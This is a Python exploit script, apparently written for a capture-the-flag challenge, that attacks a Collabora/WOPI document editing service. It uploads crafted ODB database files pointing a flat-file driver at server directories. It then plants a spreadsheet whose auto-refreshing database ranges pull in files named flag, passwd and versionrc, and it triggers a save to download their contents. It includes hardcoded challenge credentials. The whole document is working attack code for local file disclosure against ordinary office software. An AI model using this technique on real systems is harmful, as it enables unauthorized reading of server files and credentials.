#!/usr/bin/env python3
"""Temporary CTF probe: auto-refreshing Calc DB ranges with flat-file ODB sources."""
import html
import http.cookiejar
import io
import re
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
import time

import websocket

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
EMAIL = "arena-93aa1301@corp"
PASSWORD = "Arena-93aa1301-CTF!"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def req(path, method="GET", data=None, headers=None, form=None, limit=1000000):
    url = urllib.parse.urljoin(BASE + "/", path)
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers = {**(headers or {}), "Content-Type": "application/x-www-form-urlencoded"}
    request = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with opener.open(request, timeout=90) as r:
            raw = r.read(limit)
            print("HTTP", method, path, "STATUS", r.status, "BYTES", len(raw), "FINAL", r.url, flush=True)
            return r.status, r.url, raw, dict(r.headers)
    except urllib.error.HTTPError as e:
        raw = e.read(limit)
        print("HTTP_ERROR", method, path, e.code, raw.decode("utf-8", "replace"), flush=True)
        return e.code, e.url, raw, dict(e.headers)


def make_odb(directory):
    # No Extension setting: the flat driver then accepts extensionless names such
    # as flag, passwd and versionrc. Disable the header so row 1 is data too.
    connection = "sdbc:flat:file://" + directory
    content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.2">
<office:body><office:database><db:data-source><db:connection-data>
<db:connection-resource xlink:href="{html.escape(connection, quote=True)}"/>
<db:login db:is-password-required="false"/>
</db:connection-data><db:driver-settings db:is-first-row-header-line="false" db:extension=""/>
<db:application-connection-settings/></db:data-source></office:database></office:body>
</office:document-content>'''
    settings = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"><office:settings/></office:document-settings>'''
    manifest = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.database"/>
<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
<manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/>
</manifest:manifest>'''
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        z.writestr(zipfile.ZipInfo("mimetype"), "application/vnd.oasis.opendocument.database", compress_type=zipfile.ZIP_STORED)
        z.writestr("content.xml", content)
        z.writestr("settings.xml", settings)
        z.writestr("META-INF/manifest.xml", manifest)
    return out.getvalue()


def host_odb(label, directory):
    _, final, _, _ = req("/docs/create", "POST", form={"folder": "", "title": label + ".odb"})
    docid = urllib.parse.urlsplit(final).path.rsplit("/", 1)[-1]
    _, _, editor, _ = req("/edit/" + docid)
    match = re.search(rb'<iframe[^>]+src=["\']([^"\']+)', editor)
    if not match:
        raise RuntimeError("No editor token for " + docid)
    iframe = html.unescape(match.group(1).decode())
    token = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)["access_token"][0]
    query = "?access_token=" + urllib.parse.quote(token, safe="")
    data = make_odb(directory)
    status, _, body, _ = req(
        "/wopi/files/" + docid + "/contents" + query,
        "POST", data,
        {"Content-Type": "application/octet-stream", "X-WOPI-Override": "PUT"},
    )
    print("ODB", label, "DOCID", docid, "DIRECTORY", directory, "PUT_STATUS", status, "PUT_BODY", body.decode("utf-8", "replace"), flush=True)
    # The Collabora kit uses the internal service name, not the public instance.
    return "http://webapp:8000/wopi/files/" + docid + "/contents" + query


def make_fods(sources):
    ranges = []
    for i, (url, table, target) in enumerate(sources):
        statement = f'SELECT * FROM "{table}"'
        ranges.append(f'''<table:database-range table:name="Import{i}" table:target-range-address="{target}" table:contains-header="false" table:refresh-delay="PT1S">
<table:database-source-sql table:database-name="{html.escape(url, quote=True)}" table:sql-statement="{html.escape(statement, quote=True)}"/>
</table:database-range>''')
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
<office:body><office:spreadsheet><table:table table:name="Sheet1">
<table:table-column table:number-columns-repeated="8"/>
<table:table-row table:number-rows-repeated="80"><table:table-cell table:number-columns-repeated="8"/></table:table-row>
</table:table><table:database-ranges>{''.join(ranges)}</table:database-ranges>
</office:spreadsheet></office:body></office:document>'''.encode()


def editor_token(docid):
    _, _, editor, _ = req("/edit/" + docid)
    match = re.search(rb'<iframe[^>]+src=["\']([^"\']+)', editor)
    if not match:
        raise RuntimeError("No editor token for " + docid)
    iframe = html.unescape(match.group(1).decode())
    return urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)["access_token"][0]


def source_url(docid):
    token = editor_token(docid)
    query = "?access_token=" + urllib.parse.quote(token, safe="")
    return "http://webapp:8000/wopi/files/" + docid + "/contents" + query


def create_payload(title, data):
    _, final, _, _ = req("/docs/create", "POST", form={"folder": "", "title": title})
    docid = urllib.parse.urlsplit(final).path.rsplit("/", 1)[-1]
    token = editor_token(docid)
    query = "?access_token=" + urllib.parse.quote(token, safe="")
    status, _, body, _ = req(
        "/wopi/files/" + docid + "/contents" + query,
        "POST", data,
        {"Content-Type": "application/octet-stream", "X-WOPI-Override": "PUT"},
    )
    print("PAYLOAD", title, "DOCID", docid, "PUT_STATUS", status, "PUT_BODY", body.decode("utf-8", "replace"), flush=True)
    return docid, token, query


def recv_for(ws, seconds, stop_on_save=False):
    deadline = time.monotonic() + seconds
    loaded = False
    saved = False
    while time.monotonic() < deadline:
        try:
            ws.settimeout(max(0.2, min(1.0, deadline - time.monotonic())))
            msg = ws.recv()
        except websocket.WebSocketTimeoutException:
            continue
        if isinstance(msg, bytes):
            print("WS_BINARY", len(msg), flush=True)
            continue
        print("WS", msg[:1200], flush=True)
        if msg.startswith("status:"):
            loaded = True
            if not stop_on_save:
                break
        if stop_on_save and ".uno:Save" in msg and ("success" in msg or "unocommandresult" in msg):
            saved = True
            # Keep draining briefly: the local save response precedes WOPI upload.
            deadline = min(deadline, time.monotonic() + 4)
        if msg.startswith("error:"):
            break
    return loaded, saved


def open_wait_save(docid, token):
    wopi_src = "http://webapp:8000/wopi/files/" + docid
    params = urllib.parse.urlencode({
        "WOPISrc": wopi_src,
        "access_token": token,
        "permission": "edit",
        "compat": "",
    })
    ws_url = BASE.replace("http://", "ws://", 1) + "/cool/ws?" + params
    cookies = "; ".join(c.name + "=" + c.value for c in jar)
    print("WS_CONNECT", ws_url, flush=True)
    ws = websocket.create_connection(ws_url, timeout=30, origin=BASE, cookie=cookies)
    try:
        now = int(time.time() * 1000)
        ws.send(f"coolclient 0.1 {now} 1")
        encoded_src = urllib.parse.quote(wopi_src, safe="-_.!~*'()")
        ws.send("load url=" + encoded_src + " timezone=Europe/Moscow")
        loaded, _ = recv_for(ws, 90)
        print("WS_LOADED", loaded, flush=True)
        if not loaded:
            return False
        # This is harmless on the vulnerable target and also exercises deferred
        # sources if a downstream build happens to have the later link gate.
        ws.send("allowlinkupdate")
        recv_for(ws, 6)
        ws.send("save")
        _, saved = recv_for(ws, 18, stop_on_save=True)
        print("WS_SAVE_RESPONSE", saved, flush=True)
        return saved
    finally:
        ws.close()


def print_saved(docid, query):
    # Let the WOPI upload finish after the kit's local .uno:Save response.
    time.sleep(3)
    status, _, raw, _ = req("/wopi/files/" + docid + "/contents" + query, limit=10000000)
    print("SAVED_DOWNLOAD_STATUS", status, "BYTES", len(raw), flush=True)
    if raw.startswith(b"PK"):
        with zipfile.ZipFile(io.BytesIO(raw)) as z:
            for name in ("content.xml", "mimetype"):
                if name in z.namelist():
                    data = z.read(name)
                    print("\n=== SAVED_" + name + " ===\n" + data.decode("utf-8", "replace"), flush=True)
    else:
        print("\n=== SAVED_DOCUMENT ===\n" + raw.decode("utf-8", "replace"), flush=True)


def main():
    req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
    # d4/d5/d6 are the ODB documents uploaded by the previous probe.
    sources = [
        (source_url("d4"), "flag", "Sheet1.A1:Sheet1.A20"),
        (source_url("d5"), "passwd", "Sheet1.C1:Sheet1.C60"),
        (source_url("d6"), "versionrc", "Sheet1.E1:Sheet1.E20"),
    ]
    docid, token, query = create_payload("refresh.fods", make_fods(sources))
    open_wait_save(docid, token)
    print_saved(docid, query)


if __name__ == "__main__":
    main()
